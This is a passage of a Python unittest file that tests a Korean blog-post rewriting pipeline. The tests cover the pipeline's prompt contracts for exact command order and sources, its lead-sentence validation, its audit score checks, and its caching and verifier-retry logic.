            with self.subTest(parallel_launcher_contract=command_text):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"실행은 `{command_text}`이다."}],
                    "limitations": [],
                })[0]
                self.assertTrue(rewrite.is_distributed_training_command(command))
                self.assertTrue(
                    rewrite.distributed_launcher_has_explicit_parallelism(command)
                )

        verification_text = rewrite.verification_prompt(
            {"reader_promise": "전체 학습 절차", "facts": [], "limitations": []},
            draft,
        )
        self.assertIn("더 좁은 질문으로 정직하게 범위를 줄이는 것은 허용", verification_text)

    def test_retry_prompts_lock_scope_and_delete_rejected_headings(self):
        research_text = rewrite.research_prompt(
            {"title": "Activepieces"},
            [],
            {
                "reader_promise": "가격, MCP, 설치를 모두 비교합니다",
                "facts": [],
                "limitations": [],
            },
            [
                "검색 의도·독자 약속이 가격·법적 조건·MCP·설치 중 독립 축을 "
                "3개 결합함: 가격·플랜, MCP 연동, 설치·배포",
                "검색 의도·독자 약속의 '가격·비용' 초점을 직접 지지하는 F/L이 없음",
                "검색 의도·독자 약속의 명령 이름만 있고 실행 구문이 없음: docker",
            ],
        )
        self.assertIn("정확히 하나만 선택", research_text)
        self.assertIn("이번 재시도의 가격 축 금지", research_text)
        self.assertIn("article_format을 explainer 또는 decision_guide", research_text)
        self.assertIn("CLI·명령·실행·방법·절차", research_text)

        draft_text = rewrite.draft_prompt(
            {"title": "Activepieces"},
            {"facts": [], "limitations": []},
            {
                "title": "Activepieces 설치",
                "content": "## MCP 연동\n\n내용",
            },
            [
                "orphan_section: H2 'MCP 연동'의 축 'MCP'가 첫 설명 문장에서도 "
                "제목의 독자 과업과 명시적으로 연결되지 않음"
            ],
        )
        self.assertIn("이번 응답에서 삭제할 H2", draft_text)
        self.assertIn("- MCP 연동", draft_text)
        self.assertIn("아직 쓰지 않은 F/L로 대체 섹션", draft_text)
        self.assertIn("'과/및/·'로 정상 H2와 합치지", draft_text)

    def test_prompts_publish_exact_cli_and_source_locks(self):
        research = {
            "reader_problem": "Slurm 작업을 제출하고 조회합니다.",
            "reader_promise": (
                "순서대로 `sbatch job.sh`, `squeue`, `squeue -h`, "
                "`squeue`를 실행합니다."
            ),
            "recommended_angle": "명령 실행 순서를 설명합니다.",
            "popular_questions": [],
            "sources": [
                {"url": "https://example.com/sbatch"},
                {"url": "https://example.com/squeue"},
            ],
            "facts": [
                {"statement": "제출은 `sbatch job.sh`이다."},
                {"statement": "조회는 `squeue`이다."},
                {"statement": "헤더 없는 조회는 `squeue -h`이다."},
            ],
            "limitations": [],
        }
        execution_lock = rewrite.prompt_execution_contract(research)
        execution_contract = json.loads(execution_lock)
        self.assertIn('"sbatch job.sh"', execution_lock)
        self.assertIn('"squeue"', execution_lock)
        self.assertNotIn("account_name", execution_lock)
        self.assertEqual(
            execution_contract["required_inline_invocations_exact_argv"],
            ["sbatch job.sh", "squeue", "squeue -h"],
        )
        self.assertEqual(
            execution_contract["required_inline_ordered_sequences_exact_argv"],
            [["sbatch job.sh", "squeue", "squeue -h", "squeue"]],
        )
        source_lock = rewrite.prompt_source_contract(research)
        self.assertIn("https://example.com/sbatch", source_lock)
        self.assertIn("https://example.com/squeue", source_lock)

        draft_text = rewrite.draft_prompt(
            {},
            research,
            {"content": ""},
            ["검색 의도에서 약속한 명령의 실행 예제가 본문에 없음: squeue"],
        )
        self.assertIn("실행 코드 잠금", draft_text)
        self.assertIn("squeue -A account_name", draft_text)
        self.assertIn("서로 다른 URL 중 최소 2개", draft_text)
        self.assertIn("정확히 같은 순서와 횟수", draft_text)

        audit_text = rewrite.audit_prompt(
            {},
            research,
            {"content": ""},
            ["본문에서 서로 다른 직접 원문 2개를 인용하지 않음"],
        )
        self.assertIn("required 이름은 남기고", audit_text)
        self.assertIn("content에 서로 다른 URL 최소 2개", audit_text)
        self.assertIn("정확히 같은 순서와 횟수", audit_text)

    def test_exact_cli_presence_and_explicit_order_are_separate_contracts(self):
        nonsequenced = {
            "search_intent": "조회 예시는 `squeue`로 실행합니다.",
            "reader_promise": "제출은 `sbatch job.sh`로 실행합니다.",
            "facts": [
                {"statement": "조회 명령은 `squeue`이다."},
                {"statement": "제출 명령은 `sbatch job.sh`이다."},
            ],
            "limitations": [],
        }
        contract = json.loads(rewrite.prompt_execution_contract(nonsequenced))
        self.assertEqual(
            contract["required_inline_invocations_exact_argv"],
            ["squeue", "sbatch job.sh"],
        )
        self.assertEqual(
            contract["required_inline_ordered_sequences_exact_argv"],
            [],
        )
        workflow_order = {
            "content": "```bash\nsbatch job.sh\nsqueue\n```",
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(workflow_order, nonsequenced),
            [],
        )

        sequenced = {
            "reader_promise": (
                "먼저 `python train.py --phase 1`, 다음 "
                "`python fit.py --epochs 2`를 실행합니다."
            ),
            "popular_questions": [
                "검증은 `python test.py --checkpoint latest`로 실행하나요?"
            ],
            "facts": [
                {"statement": "준비는 `python train.py --phase 1`이다."},
                {"statement": "학습은 `python fit.py --epochs 2`이다."},
                {"statement": "검증은 `python test.py --checkpoint latest`이다."},
            ],
            "limitations": [],
        }
        contract = json.loads(rewrite.prompt_execution_contract(sequenced))
        self.assertEqual(
            contract["required_inline_invocations_exact_argv"],
            [
                "python train.py --phase 1",
                "python fit.py --epochs 2",
                "python test.py --checkpoint latest",
            ],
        )
        self.assertEqual(
            contract["required_inline_ordered_sequences_exact_argv"],
            [["python train.py --phase 1", "python fit.py --epochs 2"]],
        )

    def test_answer_first_gate_rejects_preview_leads_and_second_sentence_rescue(self):
        tail = (
            "\n\n## 선택 기준\n\n" + ("근거 범위를 확인합니다. " * 55)
            + "\n\n## 적용 시 주의\n\n" + ("조건을 비교합니다. " * 55)
        )

        def errors_for(lead):
            return rewrite.validate_draft(
                {
                    "title": "테스트 선택 전에 확인할 실제 조건과 주의점",
                    "description": "테스트 선택 전에 필요한 적용 조건과 주의점을 직접 비교해 현재 상황에 맞는 판단 기준을 정리한 설명입니다.",
                    "summary": "테스트 선택 전에 적용 조건과 주의점을 함께 확인합니다. 현재 상황에서 비교할 판단 기준과 제한 범위를 구분합니다. 실행 전에 다시 볼 항목도 제시합니다.",
                    "content": lead + tail,
                    "tags": ["테스트", "선택", "조건", "주의", "비교"],
                    "entities": ["테스트"],
                    "faq": [],
                },
                {"sources": [], "primary_keyword": "테스트"},
                {},
            )

        for lead in (
            "확인해야 합니다. 이 조건을 지금 확인하면 선택할 수 있습니다.",
            "살펴봅니다. 결론은 현재 조건에 맞는 항목을 선택하는 것입니다.",
            "먼저 테스트가 무엇인지 정의합니다. 조건별 차이는 뒤에서 설명합니다.",
            "테스트의 핵심 기능은 여러 항목을 비교하는 것입니다. 선택 기준은 다음과 같습니다.",
            "결론을 먼저 확인합니다. 세부 조건은 뒤에서 살펴봅니다.",
            "이 제품의 문제는 설정입니다. 먼저 제품의 정의를 설명합니다.",
            "결론부터 말하면, CycleGAN은 비정렬 이미지 변환 모델입니다.",
            "핵심은 CycleGAN이 비정렬 이미지를 바꾸는 모델이라는 점입니다.",
            "CycleGAN에서는 비정렬 이미지 변환이 가능합니다.",
            "주의할 점은 CycleGAN이라는 모델의 기본 구조입니다.",
            "결론부터 말하면, CycleGAN은 두 도메인을 변환하는 네트워크입니다.",
            "핵심은 CycleGAN이 이미지 변환 기법이라는 점입니다.",
            "결론부터 말하면, CycleGAN은 이미지 변환을 목표로 합니다.",
            "주의할 점은 CycleGAN이 이미지 변환용 프로그램입니다.",
            "결론부터 말하면, CycleGAN은 분류 모델이 아니라 이미지 변환 네트워크입니다.",
        ):
            errors = errors_for(lead)
            self.assertTrue(any("도입부가" in error for error in errors), errors)

        errors = errors_for(
            "결론부터 말하면, 현재 조건과 맞지 않는 항목은 선택하지 말아야 합니다. "
            "적용 전에는 제한 범위를 먼저 비교합니다."
        )
        self.assertFalse(any("도입부가" in error for error in errors), errors)

    def test_audit_rejects_nonfinite_and_out_of_range_scores(self):
        base = {
            "final_supported": True,
            "final_reader_ready": True,
            "evidence_score": 9,
            "reader_score": 8,
            "removed_or_corrected": [],
            "final_draft": {},
        }
        with patch.object(rewrite, "validate_draft", return_value=[]):
            for field, value in (
                ("evidence_score", float("nan")),
                ("evidence_score", float("inf")),
                ("reader_score", 100),
                ("reader_score", -1),
            ):
                audit = rewrite.clean_audit({**base, field: value})
                errors = rewrite.validate_audit(audit, {}, {})
                self.assertTrue(any("0~10" in error for error in errors))

    def test_audit_is_cached_only_after_independent_verification(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        draft = {
            "title": "검증 대상 제목",
            "description": "검증 대상 설명",
            "summary": "검증 대상 요약",
            "content": "검증 대상 본문",
            "tags": [],
            "entities": [],
            "faq": [],
        }
        audit_value = {
            "final_supported": True,
            "final_reader_ready": True,
            "evidence_score": 10,
            "reader_score": 9,
            "removed_or_corrected": [],
            "final_draft": draft,
        }
        verification_value = {
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": [],
        }
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(Path(directory), [post])
            with (
                patch.object(
                    rewrite,
                    "generate_json",
                    side_effect=[audit_value, verification_value],
                ) as generate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(rewrite, "validate_verification", return_value=[]),
            ):
                _, audit = rewrite.obtain_audit(
                    post,
                    {},
                    {},
                    draft,
                    state,
                    attempts=1,
                )
            self.assertEqual(generate.call_count, 2)
            self.assertTrue(audit["verification"]["approved"])
            self.assertTrue(state.cache_path("audit", post).is_file())
            self.assertEqual(state.record(post)["status"], "verified")

            # F1 등의 의미가 바뀐 research에는 과거 verification 캐시를 재사용하면 안 된다.
            changed_research = {
                "facts": [{"id": "F1", "statement": "새로 바뀐 근거"}],
                "limitations": [],
            }
            with (
                patch.object(
                    rewrite,
                    "generate_json",
                    side_effect=[audit_value, verification_value],
                ) as regenerate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(rewrite, "validate_verification", return_value=[]),
            ):
                rewrite.obtain_audit(
                    post,
                    {},
                    changed_research,
                    draft,
                    state,
                    attempts=1,
                )
            self.assertEqual(regenerate.call_count, 2)

            # 현재 research와 final draft 해시에 맞는 캐시는 모델 호출 없이 재사용한다.
            with (
                patch.object(rewrite, "generate_json") as cached_generate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(rewrite, "validate_verification", return_value=[]),
            ):
                rewrite.obtain_audit(
                    post,
                    {},
                    changed_research,
                    draft,
                    state,
                    attempts=1,
                )
            cached_generate.assert_not_called()

            # 깨진 캐시는 실패로 고정하지 않고 안전하게 새 결과로 교체한다.
            state.cache_path("audit", post).write_text("{broken", encoding="utf-8")
            with (
                patch.object(
                    rewrite,
                    "generate_json",
                    side_effect=[audit_value, verification_value],
                ) as broken_regenerate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(rewrite, "validate_verification", return_value=[]),
            ):
                rewrite.obtain_audit(
                    post,
                    {},
                    changed_research,
                    draft,
                    state,
                    attempts=1,
                )
            self.assertEqual(broken_regenerate.call_count, 2)

    def test_verifier_format_error_retries_verifier_without_reauditing(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        draft = {
            "title": "검증 대상 제목",
            "description": "검증 대상 설명",
            "summary": "검증 대상 요약",
            "content": "검증 대상 본문",
            "tags": [],
            "entities": [],
            "faq": [],
        }
        audit_value = {
            "final_supported": True,
            "final_reader_ready": True,
            "evidence_score": 10,
            "reader_score": 9,
            "removed_or_corrected": [],
            "final_draft": draft,
        }
        verification_value = {
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": [],
        }
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(Path(directory), [post])
            with (
                patch.object(
                    rewrite,
                    "generate_json",
                    side_effect=[audit_value, verification_value, verification_value],
                ) as generate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(
                    rewrite,
                    "validate_verification",
                    side_effect=[["주요 주장 대조 수 부족"], []],
                ),
                patch.object(rewrite.time, "sleep"),
            ):
                rewrite.obtain_audit(post, {}, {}, draft, state, attempts=2)
            self.assertEqual(generate.call_count, 3)
            self.assertIn("주요 주장 대조 수 부족", generate.call_args_list[2].args[0])

    def test_host_literal_error_returns_to_audit_instead_of_rechecking_same_draft(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        draft = {
            "title": "설치 절차에서 버전을 확인하는 방법",
            "description": "공식 설치 절차를 근거 범위 안에서 확인하는 테스트 설명입니다.",
            "summary": "공식 설치 절차를 확인합니다. 근거 없는 버전은 제거합니다.",
            "content": "공식 문서는 PyTorch 2.4 설치 절차를 설명합니다.",
            "tags": ["설치", "PyTorch", "버전", "검증", "공식문서"],
            "entities": ["PyTorch"],
            "faq": [],
        }
        revised = {**draft, "content": "공식 문서는 설치 절차를 설명합니다."}

        def audit_value(final_draft):
            return {
                "final_supported": True,
                "final_reader_ready": True,
                "evidence_score": 10,
                "reader_score": 9,
                "removed_or_corrected": [],
                "final_draft": final_draft,
            }

        verification_value = {
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": [],
        }
        literal_error = "U002의 수치·버전·코드 리터럴이 연결 근거에 없음: 2.4"
        self.assertTrue(rewrite.verification_errors_require_draft_revision([literal_error]))
        self.assertFalse(rewrite.verification_errors_require_draft_revision([
            "독립 검증 unit 집합 불일치"
        ]))
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(Path(directory), [post])
            with (
                patch.object(
                    rewrite,
                    "generate_json",
                    side_effect=[
                        audit_value(draft),
                        verification_value,
                        audit_value(revised),
                        verification_value,
                    ],
                ) as generate,
                patch.object(rewrite, "validate_audit", return_value=[]),
                patch.object(
                    rewrite,
                    "validate_verification",
                    side_effect=[[literal_error], []],
                ),
                patch.object(rewrite.time, "sleep"),
            ):
                final_draft, _ = rewrite.obtain_audit(
                    post,
                    {},
                    {},
                    draft,
                    state,
                    attempts=2,
                )
            self.assertEqual(generate.call_count, 4)
            self.assertEqual(final_draft["content"], revised["content"])
            self.assertIn(literal_error, generate.call_args_list[2].args[0])
            state.close()


if __name__ == "__main__":
    unittest.main()
